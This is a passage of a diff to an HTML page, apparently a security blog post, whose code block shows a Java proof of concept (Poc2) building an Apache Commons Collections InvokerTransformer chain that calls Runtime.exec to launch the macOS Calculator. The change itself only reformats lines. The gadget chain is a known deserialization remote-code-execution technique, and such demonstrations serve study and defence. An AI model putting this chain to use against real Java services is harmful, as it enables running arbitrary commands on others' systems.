@@ -199,7 +199,8 @@
 public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc2</span> </span>{
     public <span class="hljs-literal">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-built_in">String</span>[] args) throws Exception {
         Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
-                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>), <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, Class[].<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
+                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),
+                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, Class[].<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
                 <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[<span class="hljs-number">0</span>]}),
                 <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]{<span class="hljs-string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>}),
         };
@@ -224,7 +225,7 @@ public <span class="hljs-class"><span class="hljs-keyword">class</span> <span cl
     }
 }</code></pre>
                 	
-                </div>
+                </div>	
                
            
            
